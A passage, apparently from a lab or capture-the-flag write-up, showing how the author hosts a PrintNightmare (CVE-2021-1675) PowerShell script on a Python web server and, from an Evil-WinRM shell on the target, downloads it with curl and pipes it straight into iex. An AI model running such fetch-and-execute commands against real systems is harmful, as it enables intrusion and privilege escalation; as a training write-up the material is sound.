The simplest way to handle this is to just read it from my host as an HTTP request and pipe that into `iex` (or `Invoke-Expression`). I’ll start a Python web server on my host in the directory where the PS1 script is with `python3 -m http.server 80`, and the request the file:

```jsx
*Evil-WinRM* PS C:\\programdata> curl 10.10.14.6/CVE-2021-1675.ps1 -UseBasicParsing | iex
```
